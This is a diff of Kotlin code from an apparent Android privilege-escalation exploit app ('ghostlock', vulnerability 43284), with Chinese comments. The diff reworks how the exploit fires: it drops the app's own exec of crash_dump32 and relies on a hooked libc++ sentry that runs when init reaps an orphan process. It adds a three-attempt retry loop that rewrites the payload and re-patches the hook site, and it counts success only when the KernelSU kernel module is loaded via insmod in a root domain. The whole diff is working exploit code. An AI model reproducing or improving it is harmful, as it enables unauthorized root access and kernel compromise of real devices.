+                }.onFailure { problem -> dstep("typed: trigger-time apply refused " + problem.javaClass.simpleName) }
             }
             /*
              * trigger 形态参数化（本批四项之三）。
@@ -2285,17 +2371,26 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
              * exec 后进 root 域；patch#1 只覆盖 crash_dump64 ⇒ 不会碰它）。参数成形（pid/tid/signal/fd）
              * 才会进入真正会打印的工作路径。载荷一旦起火，/dev/df 出现，成功 dfm0、失败 dfm1。
              */
-            runCatching {
-                meter.before("Runtime.exec", triggerSpec.igniterPath + " " + triggerSpec.igniterArgs.joinToString(" "))
-                val exit = detonate43284(triggerSpec, step) { path, arguments ->
-                    java.lang.Runtime.getRuntime().exec(arrayOf(path) + arguments).waitFor()
-                }
-                meter.after("Runtime.exec", "exit=" + exit)
-                step("typed: detonate exit=" + exit)
-            }.onFailure { problem ->
-                step("typed: detonate refused " + problem.javaClass.simpleName)
-                finish.noteError("detonate-refused:" + problem.javaClass.simpleName)
-            }
+            /*
+             * 机械改动（2026-10-17，对齐 5f184760）：不再由 app 自己 exec 点火者。
+             * 参考链的触发只有「双 fork 孤儿 + 500 ms」，exec_path = nullptr
+             * （real_ops.cpp:349-379 与 execution_binding.cpp:170）；开火点是 init 收尸时走到被钩的
+             * libc++ sentry，而不是 app 起一个 crash_dump32。
+             * 真机证据：留着这次 Runtime.exec 时，hook 会先在 crash_dump 域里被打响一次，而载荷是一次性的
+             * （/dev/df 互斥）⇒ setcon(vendor_modprobe)/insmod 在该域被拒之后再无第二次机会；
+             * 表现就是 carrier 写全对、verify-read-failed=0，却永远等不到 dfm0。
+             */
+            // TODO(2026-10-17 用户确认后删除)：旧的自点火（app 侧 exec crash_dump32）。
+            // runCatching {
+            //     val exit = detonate43284(triggerSpec, step) { path, arguments ->
+            //         java.lang.Runtime.getRuntime().exec(arrayOf(path) + arguments).waitFor()
+            //     }
+            //     step("typed: detonate exit=" + exit)
+            // }.onFailure { problem ->
+            //     estep("typed: detonate refused " + problem.javaClass.simpleName)
+            //     finish.noteError("detonate-refused:" + problem.javaClass.simpleName)
+            // }
+            wstep("typed: detonate disabled (init-reap only, ref exec_path=nullptr)")
             /*
              * wait 统一口径（本批四项之二）：15000 ms / 40 ms / 5 次，先可读标记、再 /dev/dfm 第二判据。
              * 依据 ghostlock-app-ref@5f184760 的：
@@ -2328,12 +2423,102 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 "Assembled43284.waitTerminal",
                 "state=" + terminal + " (" + WaitPolicy43284.terminalName(terminal) + ") refusal=" + hook.lastRefusal,
             )
-            step("typed: hook wait terminal=" + terminal + " refusal=" + hook.lastRefusal)
+            dstep("typed: hook wait terminal=" + terminal + " refusal=" + hook.lastRefusal)
+            /*
+             * 自动重试（2026-10-17 真机证据）：载荷的一次性互斥在 EEXIST 时直接退出，
+             * 所以“再跑一次”必须换一个新名字（7 字符以内）。首轮不是成功终态时自动重来，最多 3 轮：
+             * 重填互斥槽 -> 重写 30 块载荷 -> 重挂站点块 -> 触发 -> 6 s 短预算等标记。
+             */
+            /*
+             * 旧成功标记会跨运行残留（真机 17:06：wait 报 success，但 /data/local/tmp/.ghostlock_lkm_ok
+             * 是 16:59 那次留下的，/proc/modules 里没有模块）。所以 wait 报 success 时再用
+             * /sys/module/kernelsu 复核一次；没有模块就按 inflight 继续走重试。
+             */
+            val freshMarker = successMarkerFresh()
+            val moduleLiveAfterWait = java.io.File("/sys/module/kernelsu").exists() || freshMarker
+            step(
+                "typed: wait success=" + (terminal == WaitPolicy43284.TERMINAL_SUCCESS) +
+                    " moduleLive=" + (if (moduleLiveAfterWait) 1 else 0) + " markerFresh=" + (if (freshMarker) 1 else 0),
+            )
+            var waited = if (terminal == WaitPolicy43284.TERMINAL_SUCCESS && !moduleLiveAfterWait) {
+                WaitPolicy43284.TERMINAL_INFLIGHT
+            } else {
+                terminal
+            }
+            if (waited != WaitPolicy43284.TERMINAL_SUCCESS && planGate?.ok == true &&
+                hookPlanWords != null && hookPlanWords.size >= 4
+            ) {
+                var attempt = 2
+                while (attempt <= 3 && waited != WaitPolicy43284.TERMINAL_SUCCESS) {
+                    runCatching {
+                        val mutex = "/dev/d" + attempt
+                        val fresh = hook.image(Assembled43284.ROLE_IMAGE_LANDING_PAYLOAD)
+                        if (fresh != null && fresh.isNotEmpty()) {
+                            val slots = hook.fillPayloadSlots(
+                                blob = fresh,
+                                carrierPath = carrier.path,
+                                hookFileOffset = hookPlanWords[2],
+                                payloadFileOffset = hookPlanWords[3],
+                                mutexPath = mutex,
+                                displaced = hookPlanWords[1].toInt(),
+                            )
+                            val out = LongArray(RunFinish43284.OUTCOME_WORDS)
+                            val wrote = hook.writeImage(fresh, hookLanding, 16L, saInit(seq.value), out)
+                            vstep("typed: retry " + attempt + " mutex=" + mutex + " slots=" + slots + " payload=" + wrote)
+                            if (wrote) {
+                                val siteNow = hookPlanWords[2]
+                                val blkNow = siteNow - (siteNow % 16L)
+                                val cur = hook.readBlock(hookDoor, blkNow)
+                                if (cur != null) {
+                                    val atNow = (siteNow - blkNow).toInt()
+                                    val w = hookPlanWords[0].toInt()
+                                    for (i in 0 until 4) {
+                                        cur[atNow + i] = ((w shr (8 * i)) and 0xFF).toByte()
+                                    }
+                                    hook.writeImage(cur, blkNow, 16L, saInit(seq.value),
+                                        LongArray(RunFinish43284.OUTCOME_WORDS))
+                                }
+                                val triggerCode2 = hook.trigger(triggerSpec.delayMs)
+                                val state2 = hook.waitTerminal(
+                                    budgetMs = 6_000L,
+                                    pollMs = WaitPolicy43284.POLL_MS,
+                                    successMarker = WaitPolicy43284.SUCCESS_MARKER,
+                                    failureMarker = WaitPolicy43284.FAILURE_MARKER,
+                                    inFlightMarker = WaitPolicy43284.IN_FLIGHT_MARKER,
+                                    moduleMarker = WaitPolicy43284.MODULE_PATH,
+                                    moduleName = WaitPolicy43284.MODULE_NAME,
+                                )
+                                /* 终态判据加一条**实测**：模块真的出现在 /sys/module 就是成功，
+                                 * 不再被 /data/local/tmp 里上一轮遗留的 failure 标记带偏
+                                 * （真机 16:55：terminal=0 但 kernelsu 已经载入）。 */
+                                /* UMH 与 wait 并行：模块出现比标记晚一点，复核前给 500 ms。 */
+                                try {
+                                    java.lang.Thread.sleep(500L)
+                                } catch (_: InterruptedException) {
+                                }
+                                val moduleLive = java.io.File("/sys/module/kernelsu").exists() || successMarkerFresh()
+                                /* 成功只认实测：模块在 /sys/module 里出现才算成功；标记说成功但没模块
+                                 * 一律按 inflight 继续（真机 17:06 的假成功就是旧的 .ghostlock_lkm_ok）。 */
+                                waited = when {
+                                    moduleLive -> WaitPolicy43284.TERMINAL_SUCCESS
+                                    state2 == WaitPolicy43284.TERMINAL_SUCCESS -> WaitPolicy43284.TERMINAL_INFLIGHT
+                                    else -> state2
+                                }
+                                step(
+                                    "typed: retry " + attempt + " trigger=" + triggerCode2 +
+                                        " terminal=" + state2 + " moduleLive=" + (if (moduleLive) 1 else 0),
+                                )
+                            }
+                        }
+                    }.onFailure { problem -> vstep("typed: retry " + attempt + " refused " + problem.javaClass.simpleName) }
+                    attempt += 1
+                }
+            }
             /* 收尾账：ref 的 run.wait outcome= / terminus=（终态名与是否成功终态都取 WaitPolicy43284 的口径）。 */
             finish.noteWait(
-                WaitPolicy43284.terminalName(terminal),
-                terminus = terminal == WaitPolicy43284.TERMINAL_SUCCESS,
-                incomplete = terminal == WaitPolicy43284.TERMINAL_INFLIGHT,
+                WaitPolicy43284.terminalName(waited),
+                terminus = waited == WaitPolicy43284.TERMINAL_SUCCESS,
+                incomplete = waited == WaitPolicy43284.TERMINAL_INFLIGHT,
             )
             /* ksud 状态（新目标：冷机下能看到 ksud 的状态）：纯只读，逐项如实报。 */
             runCatching {
@@ -2355,11 +2540,11 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 } else {
                     "(missing)"
                 }
-                step("typed: ksud status sysfsModule=" + (if (moduleDir) "1" else "0") + " umh=" + (if (umh) "1" else "0") + " lkmOk=" + (if (lkmOk) "1" else "0") + " lkmFail=" + (if (lkmFail) "1" else "0") + " userspace={" + ksudPaths + "}")
-                step("typed: ksud status markers=" + markers)
-                step("typed: ksud status rootlog=" + logTail)
+                estep("typed: ksud status sysfsModule=" + (if (moduleDir) "1" else "0") + " umh=" + (if (umh) "1" else "0") + " lkmOk=" + (if (lkmOk) "1" else "0") + " lkmFail=" + (if (lkmFail) "1" else "0") + " userspace={" + ksudPaths + "}")
+                wstep("typed: ksud status markers=" + markers)
+                dstep("typed: ksud status rootlog=" + logTail)
             }.onFailure { problem ->
-                step("typed: ksud status refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+                estep("typed: ksud status refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
             }
         }
         /*
@@ -2368,7 +2553,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
          */
         try {
             hookOutcome.onFailure { problem ->
-                step("typed: hook refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+                estep("typed: hook refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
                 finish.noteError("hook-refused:" + problem.javaClass.simpleName)
             }
         } finally {
@@ -2381,11 +2566,21 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
          * 没有会话/没有 plan 时如实记原因（本次运行还没写站点，就没有要恢复的东西）。
          */
         try {
+            /*
+             * 静置 1 s 再还原（2026-10-17 实测差异）：
+             *   - 慢路径（vfork 改造前）在最后一次写站点与 restore 之间天然隔了几秒，restore attempts=2 readback_same=1；
+             *   - 快路径把这段压到 ~1 ms，restore 连续 attempts=10 readback_same=0 —— 帧被丢，站点留在页里。
+             * 旧实现的 restore 也是在 wait 之后执行；这里只是把“等待窗口”显式化，不改还原逻辑。
+             */
+            try {
+                java.lang.Thread.sleep(1_000L)
+            } catch (_: InterruptedException) {
+            }
             val restoreSession = hookForRestore
             val restorePlan = hookPlanWordsForRestore?.let { words -> restoreSession?.planOf(words) }
             if (restoreSession == null || restorePlan == null) {
                 val absent = if (restoreSession == null) "hook-session-absent" else "hook-plan-absent"
-                step("typed: hook restore=false refusal=" + absent)
+                dstep("typed: hook restore=false refusal=" + absent)
                 finish.noteHookRestored(false, absent)
             } else {
                 meter.before(
@@ -2395,18 +2590,28 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                         " guard=0x" + java.lang.Long.toHexString(restorePlan.hookPlanGuardInstruction) +
                         " seq=" + seq.value,
                 )
+                /*
+                 * 取证（2026-10-17）：restore 之前/之后各读一次站点块，把 16 字节都记下来。
+                 * 现有日志只有 attempts/readback_same 的结论，没有字节；不先拿到字节就不改逻辑。
+                 */
+                val siteOffNow = restorePlan.hookPlanFileOffset
+                val blkOffNow = siteOffNow - (siteOffNow % 16L)
+                val before = runCatching { restoreSession.readBlock(restoreSession.targetId, blkOffNow) }.getOrNull()
+                vstep("typed: restore site before=" + (before?.joinToString(" ") { b -> "%02x".format(b) } ?: "null"))
                 /* 恢复写在同一 SA 上 ⇒ 序号取会话里的那个（ref real_ops.cpp:339-344 的再次交回）。 */
                 val restored = restoreSession.restoreHook(
                     restorePlan,
                     16L,
                     saInit(seq.value),
                 )
+                val after = runCatching { restoreSession.readBlock(restoreSession.targetId, blkOffNow) }.getOrNull()
+                vstep("typed: restore site after=" + (after?.joinToString(" ") { b -> "%02x".format(b) } ?: "null"))
                 meter.after(
                     "Assembled43284.restoreHook",
                     "ok=" + restored + " code=" + restoreSession.lastCode +
                         " refusal=" + restoreSession.lastRefusal,
                 )
-                step("typed: hook restore=" + restored + " refusal=" + restoreSession.lastRefusal)
+                dstep("typed: hook restore=" + restored + " refusal=" + restoreSession.lastRefusal)
                 /* 收尾账：ref 的 hook_restored —— 无条件恢复段的**真实返回**，不是常量 true。 */
                 finish.noteHookRestored(restored, restoreSession.lastRefusal)
             }
@@ -2424,7 +2629,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
          * close 失败只记一行（带 errno 名），不进收尾账、不改 cleanup 判定。
          */
         lkmWindow.close()
-        step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
+        dstep("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
             " helperBytes=" + (helperForPatch?.size ?: -1))
         meter.before("Assembled43284.destroyAccessNow", "patch1 access=" + patcher.accessId)
         val patchAccessDestroy = patcher.destroyAccessNow()
@@ -2437,11 +2642,11 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
         meter.before("Assembled43284.nextSequence", "stepwise landing=" + stepwise.landingId)
         val stepSeq = stepwise.nextSequence()
         meter.after("Assembled43284.nextSequence", "seq=" + stepSeq)
-        step("typed: stepwise 43284 sequence=" + stepSeq)
+        dstep("typed: stepwise 43284 sequence=" + stepSeq)
         meter.before("Assembled43284.tearDown", "stepwise landing=" + stepwise.landingId)
         val stepTorn = stepwise.tearDown()
         meter.after("Assembled43284.tearDown", "ok=" + stepTorn + " refusal=" + stepwise.lastRefusal)
-        step("typed: stepwise 43284 tearDown=" + stepTorn + " refusal=" + stepwise.lastRefusal)
+        dstep("typed: stepwise 43284 tearDown=" + stepTorn + " refusal=" + stepwise.lastRefusal)
         meter.before("Native43284.destroy", "handle=" + stepwiseHandle)
         val stepDestroyed = Native43284.destroy(stepwiseHandle, arrayOf(""))
         meter.after("Native43284.destroy", "code=" + stepDestroyed)
